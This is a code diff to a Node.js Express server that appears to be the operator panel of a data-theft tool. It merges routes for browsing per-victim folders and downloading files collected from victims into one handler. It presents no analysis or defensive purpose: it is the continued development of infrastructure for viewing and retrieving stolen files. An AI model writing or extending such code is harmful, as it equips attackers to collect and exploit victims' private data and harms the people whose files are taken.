@@ -69,36 +69,6 @@ app.post("/send", async (req, res) => {
   }
 });
 
-// --- Browse victim files (recursive) ---
-app.get("/victim/:id/*", async (req, res) => {
-  const safeId = path.basename(req.params.id);
-  const subPath = req.params[0] || "";
-  const victimDir = path.join(VICTIMS_DIR, safeId);
-  const currentDir = path.join(victimDir, subPath);
-
-  let items = [];
-  try {
-    items = await fs.readdir(currentDir, { withFileTypes: true });
-  } catch (err) {
-    console.error("Failed to read folder:", err);
-    return res.status(404).send("Not found");
-  }
-
-  const parentDir = subPath ? path.dirname(subPath) : "";
-  const backLink = parentDir && parentDir !== "." 
-    ? `<a href="/victim/${safeId}/${parentDir.replace(/\\/g, "/")}">⬅️ ..</a><br>` 
-    : "";
-
-  res.send(
-    `<h2>Victim: ${safeId}${subPath ? "/" + subPath.replace(/\\/g, "/") : ""}</h2>
-    ${backLink}
-    <ul>${items.map(item => {
-      const href = `/victim/${safeId}/${path.join(subPath, item.name).replace(/\\/g, "/")}`;
-      return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
-    }).join("")}</ul>`
-  );
-});
-
 // --- Root victim view ---
 app.get("/victim/:id", async (req, res) => {
   const safeId = path.basename(req.params.id);
@@ -121,21 +91,49 @@ app.get("/victim/:id", async (req, res) => {
   );
 });
 
-// --- Download specific file ---
-app.get("/victim/:id/:file(*)", async (req, res) => {
+// --- Browse victim files / Download (handles both folders and files) ---
+app.get("/victim/:id/:splat*", async (req, res) => {
   const safeId = path.basename(req.params.id);
-  const filePath = path.join(VICTIMS_DIR, safeId, req.params.file);
-  
-  if (!filePath.startsWith(path.join(VICTIMS_DIR, safeId))) {
+  const subPath = req.params.splat ? req.params.splat.join("/") : "";
+  const victimDir = path.join(VICTIMS_DIR, safeId);
+  const fullPath = path.join(victimDir, subPath);
+
+  // Security check
+  if (!fullPath.startsWith(victimDir)) {
     return res.status(403).send("Invalid path");
   }
-  
-  res.download(filePath, err => {
-    if (err) {
-      console.error("Download failed:", err);
-      res.status(404).send("File not found");
+
+  try {
+    const stats = await fs.stat(fullPath);
+    if (stats.isDirectory()) {
+      // Show folder listing
+      const items = await fs.readdir(fullPath, { withFileTypes: true });
+      const parentDir = subPath ? path.dirname(subPath) : "";
+      const backLink = parentDir && parentDir !== "."
+        ? `<a href="/victim/${safeId}/${parentDir.replace(/\\/g, "/")}">⬅️ ..</a><br>`
+        : "";
+
+      res.send(
+        `<h2>Victim: ${safeId}/${subPath.replace(/\\/g, "/")}</h2>
+        ${backLink}
+        <ul>${items.map(item => {
+          const href = `/victim/${safeId}/${path.join(subPath, item.name).replace(/\\/g, "/")}`;
+          return `<li>${item.isDirectory() ? "📁 " : "📄 "}<a href="${href}">${item.name}</a></li>`;
+        }).join("")}</ul>`
+      );
+    } else {
+      // Download file
+      res.download(fullPath, err => {
+        if (err) {
+          console.error("Download failed:", err);
+          res.status(404).send("File not found");
+        }
+      });
     }
-  });
+  } catch (err) {
+    console.error("Path error:", err);
+    res.status(404).send("Not found");
+  }
 });
 
 // --- Start server ---
